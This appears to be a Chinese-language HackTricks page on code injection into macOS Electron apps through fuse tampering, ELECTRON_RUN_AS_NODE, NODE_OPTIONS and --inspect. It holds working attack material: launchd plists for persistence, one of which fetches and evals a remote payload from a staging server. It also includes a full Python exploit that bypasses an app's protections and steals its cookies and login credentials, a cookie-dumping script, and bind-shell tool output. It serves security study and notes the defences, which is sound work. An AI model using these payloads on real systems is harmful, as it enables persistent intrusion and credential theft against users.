# macOS Electron Applications 注入

{{#include ../../../banners/hacktricks-training.md}}

## 基本信息

如果你不知道 Electron 是什么，可以在[**这里找到大量信息**](https://book.hacktricks.wiki/en/desktop-application-security/electron-desktop-apps/index.html#rce-xss--contextisolation)。不过现在只要知道 Electron 会运行 **node**。\
而 node 有一些**参数**和**环境变量**，可以用来让它**执行指定文件以外的其他代码**。

有关跨平台本地写入前置条件以及 ASAR/V8 快照路径，请参阅 [Electron 本地代码注入与快照篡改](../../../desktop-application-security/electron-desktop-apps/electron-local-code-injection-and-snapshot-tampering.md)。

### Electron Fuses

接下来会介绍这些技术，不过近来 Electron 添加了几个**安全标志来阻止它们**。这些标志就是 [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses)，以下是用于**阻止** macOS 上的 Electron 应用**加载任意代码**的标志：<sup>[[1]](#references)</sup>

- **`RunAsNode`**：如果禁用，则会阻止使用环境变量 **`ELECTRON_RUN_AS_NODE`** 注入代码。
- **`EnableNodeCliInspectArguments`**：如果禁用，则不会接受 `--inspect`、`--inspect-brk` 等参数，从而阻止通过这种方式注入代码。
- **`EnableEmbeddedAsarIntegrityValidation`**：如果启用，macOS 会**验证**加载的 **`asar`** **文件**，从而**阻止**通过修改该文件内容进行**代码注入**。
- **`OnlyLoadAppFromAsar`**：如果启用，Electron 将不再按以下顺序查找并加载：**`app.asar`**、**`app`**，最后是 **`default_app.asar`**。它只会检查并使用 app.asar。因此，如果与 **`embeddedAsarIntegrityValidation`** fuse **一起启用**，就**不可能**加载**未经验证的代码**。
- **`LoadBrowserProcessSpecificV8Snapshot`**：如果启用，浏览器进程会使用名为 `browser_v8_context_snapshot.bin` 的文件作为其 V8 快照。

另一个有趣的 fuse 不会阻止代码注入：

- **EnableCookieEncryption**：如果启用，磁盘上的 cookie 存储将使用操作系统级别的加密密钥进行加密。

### 检查 Electron Fuses

你可以通过以下方式**检查**应用中的这些标志：

```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
  RunAsNode is Disabled
  EnableCookieEncryption is Enabled
  EnableNodeOptionsEnvironmentVariable is Disabled
  EnableNodeCliInspectArguments is Disabled
  EnableEmbeddedAsarIntegrityValidation is Enabled
  OnlyLoadAppFromAsar is Enabled
  LoadBrowserProcessSpecificV8Snapshot is Disabled
```

### 修改 Electron Fuses

正如[**文档中提到的**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)，**Electron Fuses** 的配置存储在 **Electron binary** 中，其中某处包含字符串 **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**。<sup>[[1]](#references)</sup>

在 macOS 应用程序中，该文件通常位于 `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`

```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```

你可以在 [https://hexed.it/](https://hexed.it/) 中加载此文件并搜索前面的字符串。在该字符串之后，你可以看到 ASCII 格式的数字“0”或“1”，表示每个 fuse 是禁用还是启用。只需修改十六进制代码（`0x30` 是 `0`，`0x31` 是 `1`），即可**修改 fuse 值**。

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

请注意，如果尝试用这些已修改的字节**覆盖**应用程序中的 **`Electron Framework` 二进制文件**，应用将无法运行。

## 向 Electron Applications 添加代码实现 RCE

Electron App 可能会使用**外部 JS/HTML 文件**，因此攻击者可以向这些文件注入代码；这些文件的签名不会被检查，攻击者便可在应用的上下文中执行任意代码。

> [!CAUTION]
> 但是，目前存在 2 个限制：
>
> - 修改 App **需要** **`kTCCServiceSystemPolicyAppBundles`** 权限，因此默认情况下已无法进行此操作。
> - 编译后的 **`asap`** 文件通常会启用 **`embeddedAsarIntegrityValidation`** 和 **`onlyLoadAppFromAsar`** fuse
>
> 这会让此攻击路径变得更加复杂（甚至无法实现）。

请注意，可以通过将应用程序复制到另一个目录（例如 **`/tmp`**），将文件夹 **`app.app/Contents`** 重命名为 **`app.app/NotCon`**，用你的**恶意**代码**修改** **asar** 文件，再将其重命名回 **`app.app/Contents`** 并执行，以绕过 **`kTCCServiceSystemPolicyAppBundles`** 的要求。<sup>[[5]](#references)</sup>

你可以使用以下命令从 asar 文件中解包代码：

```bash
npx asar extract app.asar app-decomp
```

修改后再将其打包回去，使用：

```bash
npx asar pack app-decomp app-new.asar
```

## 使用 ELECTRON_RUN_AS_NODE 实现 RCE

根据[**文档**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)，如果设置了此环境变量，进程就会作为普通的 Node.js 进程启动。<sup>[[6]](#references)</sup>

```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

> [!CAUTION]
> 如果 fuse **`RunAsNode`** 被禁用，环境变量 **`ELECTRON_RUN_AS_NODE`** 将被忽略，因此此方法不会生效。

### 从 App Plist 注入

正如[**此处所述**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)，你可以在 plist 中滥用此环境变量来维持持久化：<sup>[[2]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
    </dict>
    <key>Label</key>
    <string>com.xpnsec.hideme</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>-e</string>
        <string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
```

## 使用 `NODE_OPTIONS` 实现 RCE

你可以将 payload 存储在另一个文件中并执行它：

```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```

> [!CAUTION]
> 如果 fuse **`EnableNodeOptionsEnvironmentVariable`** 被**禁用**，除非设置了环境变量 **NODE_OPTIONS**，否则应用启动时会**忽略**该环境变量；如果 fuse **`RunAsNode`** 被禁用，那么环境变量 **`ELECTRON_RUN_AS_NODE`** 也会被**忽略**。
>
> 如果不设置 **`ELECTRON_RUN_AS_NODE`**，你会看到**错误**：`Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### 从 App Plist 注入

你可以滥用 plist 中的这个环境变量，通过添加以下键来维持持久化：

```xml
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
           <key>NODE_OPTIONS</key>
           <string>--require /tmp/payload.js</string>
    </dict>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## 使用 inspect 实现 RCE

根据[**这篇文章**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)，如果使用 **`--inspect`**、**`--inspect-brk`** 和 **`--remote-debugging-port`** 等标志运行 Electron 应用，就会**开放一个调试端口**，供你连接（例如，从 Chrome 的 `chrome://inspect` 连接），并且你可以**向其中注入代码**，甚至启动新进程。<sup>[[7]](#references)</sup>\
例如：

```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

在[**这篇博文**](https://hackerone.com/reports/1274695)中，滥用这种 debugging，可让 headless Chrome **在任意位置下载任意文件**。<sup>[[8]](#references)</sup>

> [!TIP]
> 如果某个 app 有自定义方式来检查是否设置了环境变量或参数（例如 `--inspect`），可以尝试在运行时使用参数 `--inspect-brk` 来 **bypass** 它。该参数会在 app 开始执行时 **停止执行**，从而执行 bypass（例如，覆盖当前进程的参数或环境变量）。

以下是一个 exploit：通过使用参数 `--inspect-brk` 监控并执行 app，可以 bypass 它的自定义保护（覆盖进程参数以移除 `--inspect-brk`），然后注入 JS payload，从 app 中导出 cookies 和凭据：

```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
    const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

    fs.writeFile(filePath, data, (err) => {
        if (err) {
            console.error(`Error writing to file ${filePath}:`, err);
        } else {
            console.log(`File written successfully at ${filePath}`);
        }
    });
}

function get_cookies() {
    intervalIdCookies = setInterval(() => {
        console.log("Checking cookies...");
        wc.session.cookies.get({})
        .then((cookies) => {
            tokenCookie = cookies.find(cookie => cookie.name === "token");
            if (tokenCookie){
                writeToFile("/tmp/cookies.txt", cookies);
                clearInterval(intervalIdCookies);
                wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
            }
        })
    }, 1000);
}

function get_creds() {
    in_location = false;
    intervalIdCreds = setInterval(() => {
        if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
            in_location = true;
            console.log("Injecting creds logger...");
            wc.executeJavaScript(`
                (function() {
                    email = document.getElementById('login_email_id');
                    password = document.getElementById('login_password_id');
                    if (password && email) {
                        return email.value+":"+password.value;
                    }
                })();
            `).then(result => {
                writeToFile("/tmp/victim_credentials.txt", result);
            })
        }
        else if (in_location) {
            wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
            clearInterval(intervalIdCreds);
        }
    }, 10); // Check every 10ms
    setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
    """
    Fetch the local inspector's WebSocket URL from the JSON endpoint.
    Assumes there's exactly one debug target. 
    """
    global INSPECT_URL

    url = "http://127.0.0.1:9229/json"
    response = requests.get(url)
    data = response.json()
    if not data:
        raise RuntimeError("No debug targets found on port 9229.")
    # data[0] should contain an object with "webSocketDebuggerUrl"
    ws_url = data[0].get("webSocketDebuggerUrl")
    if not ws_url:
        raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
    INSPECT_URL = ws_url


async def monitor_victim():
    print("Monitoring victim process...")
    found = False
    while not found:
        sleep(1)  # Check every second
        for process in psutil.process_iter(attrs=['pid', 'name']):
            try:
                # Check if the process name contains "victim"
                if process.info['name'] and 'victim' in process.info['name']:
                    found = True
                    print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
                    os.kill(process.info['pid'], 9)  # Force kill the process
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                # Handle processes that might have terminated or are inaccessible
                pass
    os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
    global CONTEXT_ID, NAME, UNIQUE_ID
    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        
        sleep(1)

        await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

        await send_cmd(ws, "Profiler.enable")

        await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

        await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

        await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

        code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
        print("Injected code to bypass protections")


async def js_payloads():
    global CONT, CONTEXT_ID, NAME, UNIQUE_ID

    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
    await monitor_victim()
    sleep(3)
    await get_debugger_url()
    await bypass_protections()

    sleep(7)

    await js_payloads()
    


async def send_cmd(ws, method, get_first=False, params={}):
    """
    Send a command to the inspector and read until we get a response with matching "id".
    """
    global CONT

    CONT += 1

    # Send the command
    await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
    sleep(0.4)

    # Read messages until we get our command result
    while True:
        response = await ws.recv()
        data = json.loads(response)

        # Print for debugging
        print(f"[{method} / {CONT}] ->", data)

        if get_first:
            return data

        # If this message is a response to our command (by matching "id"), break
        if data.get("id") == CONT:
            return data

        # Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
    asyncio.run(main())
```

> [!CAUTION]
> 如果 fuse **`EnableNodeCliInspectArguments`** 被禁用，除非设置环境变量 **`ELECTRON_RUN_AS_NODE`**，否则应用启动时会**忽略 node 参数**（例如 `--inspect`）；如果 fuse **`RunAsNode`** 被禁用，该环境变量也会被**忽略**。
>
> 不过，你仍然可以使用 **electron 参数 `--remote-debugging-port=9229`**，但之前的 payload 将无法用于执行其他进程。

使用参数 **`--remote-debugging-port=9222`**，可以从 Electron App 窃取一些信息，例如 **history**（通过 GET 命令）或浏览器的 **cookies**（它们在浏览器内部会被**解密**，并且有一个 **json endpoint** 可以返回这些信息）。

你可以在[**这里**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)和[**这里**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)学习如何操作，并使用自动化工具 [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) 或类似这样的简单脚本：<sup>[[9]](#references)[[10]](#references)</sup>

```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```



### 从 App Plist 注入

你可以在 plist 中滥用此环境变量，通过添加以下键来维持持久化：

```xml
<dict>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>--inspect</string>
    </array>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## 利用旧版本绕过 TCC

> [!TIP]
> macOS 的 TCC 守护进程不会检查应用程序运行的版本。因此，如果你**无法使用前面介绍的技术向 Electron 应用注入代码**，可以下载旧版本的 APP 并向其中注入代码，因为它仍会获得 TCC 权限（除非 Trust Cache 阻止了它）。

## 运行非 JS 代码

前面的技术可以让你在 **Electron 应用的进程中运行 JS 代码**。不过，请记住，**子进程使用与父应用相同的 sandbox 配置文件**，并且**继承其 TCC 权限**。\
因此，如果你想滥用 entitlements 来访问摄像头或麦克风等资源，只需**从该进程启动另一个二进制文件**即可。

## 值得关注的 Electron macOS 漏洞（2023-2024）

### CVE-2023-44402 – ASAR 完整性检查绕过

Electron ≤22.3.23 以及多个 23-27 预发布版本中，拥有 `.app/Contents/Resources` 文件夹写入权限的攻击者可以绕过 `embeddedAsarIntegrityValidation` **和** `onlyLoadAppFromAsar` fuses。该漏洞源于完整性检查器中的 *文件类型混淆*：攻击者可以构造一个名为 `app.asar` 的**目录**，使应用加载该目录而非经过验证的归档文件，因此放在该目录中的任何 JavaScript 都会在应用启动时执行。因此，即使供应商遵循了加固指南并启用了这两个 fuses，macOS 上的应用仍可能受到该漏洞影响。<sup>[[3]](#references)</sup>

修复该问题的 Electron 版本：**22.3.24**、**24.8.3**、**25.8.1**、**26.2.1** 和 **27.0.0-alpha.7**。攻击者如果发现应用运行的是旧版本，可以用自己的目录覆盖 `Contents/Resources/app.asar`，从而以应用的 TCC entitlements 执行代码。<sup>[[3]](#references)</sup> 

### 2024 年 “RunAsNode” / “enableNodeCliInspectArguments” CVE 系列

2024 年 1 月，一系列 CVE（CVE-2024-23738 至 CVE-2024-23743）指出，许多 Electron 应用仍启用了 **RunAsNode** 和 **EnableNodeCliInspectArguments** fuses。因此，本地攻击者可以使用环境变量 `ELECTRON_RUN_AS_NODE=1` 或 `--inspect-brk` 等标志重新启动程序，将其变成一个 *通用* Node.js 进程，并继承应用的所有 sandbox 和 TCC 权限。<sup>[[4]](#references)</sup>

尽管 Electron 团队对“严重”评级提出异议，并指出攻击者仍需先获得本地代码执行能力，但该问题在 post-exploitation 阶段仍然很有用，因为它能将任何存在漏洞的 Electron 软件包变成一个 *living-off-the-land* 二进制文件，例如可读取 Contacts、Photos 或其他此前已授予桌面应用权限的敏感资源。<sup>[[4]](#references)</sup>

Electron 维护者提供的防御建议：<sup>[[4]](#references)</sup>

* 在生产版本中禁用 `RunAsNode` 和 `EnableNodeCliInspectArguments` fuses。
* 如果应用确实需要辅助 Node.js 进程，请使用较新的 **UtilityProcess** API，而不是重新启用这些 fuses。 

## 自动注入

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

工具 [**electroniz3r**](https://github.com/r3ggi/electroniz3r) 可用于轻松**查找已安装的易受攻击 Electron 应用**并向其中注入代码。该工具会尝试使用 **`--inspect`** 技术：<sup>[[5]](#references)</sup>

你需要自行编译，并可像这样使用：

```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```

- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki 旨在通过将 Electron 应用的 JavaScript 文件替换为 Loki Command & Control JavaScript 文件，来为这些应用植入后门。

## References

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [通过第三方框架进行 macOS 注入 - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [通过文件类型混淆绕过 ASAR 完整性检查 (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [关于“runAsNode” CVE 的声明 - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - 将 macOS 隐私 Electron 化：红队武器库中的新利器 - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [环境变量 | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [为什么 Electron 应用无法机密地存储你的秘密：--inspect 选项](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne 报告 #1274695 - 滥用 Electron 调试功能下载任意文件](https://hackerone.com/reports/1274695)
- [9] [Cookie 窃取：使用 Chromium 的远程调试端口转储 Cookie - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [使用 Chromium 的远程调试器排查 Cookie 转储失败问题 - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
